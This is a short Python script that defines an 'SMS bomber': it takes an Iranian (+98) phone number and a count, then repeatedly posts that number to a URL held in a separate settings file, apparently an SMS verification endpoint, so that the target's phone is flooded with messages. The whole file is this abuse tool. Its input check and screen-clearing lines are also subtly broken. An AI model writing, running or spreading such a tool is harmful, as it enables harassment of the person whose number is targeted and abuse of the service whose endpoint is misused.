from colorama import Fore as c # c means color
from requests import post
import sys
import os
import time
from setting import (
    URL,
    STRUCT,
)

def sms_boomber(phonenumber, sms_number):
    try:
        # Check if input is null or not valid (like string)
        if phonenumber == None or "" or not int:
            print(STRUCT + c.RED + " Please enter a valid number!")
        else:
            try:
            # Send sms via post http method
                data = {
                    "cellphone": "+98" + phonenumber
                }

                for i in range(int(sms_number)):
                    post(URL, data)
                    os.system("clear" or "cls")
                    print(STRUCT + c.WHITE + " Send " + c.RED + str(i) + c.WHITE + " sms successfuly!")
                            
                    time.sleep(3)

            except Exception as err:
                print(STRUCT + " Error whene sending sms!")
                sys.exit()
    except Exception as err:
        print(err)
        print(STRUCT + c.RED + "Somethink went wring! Please try again.")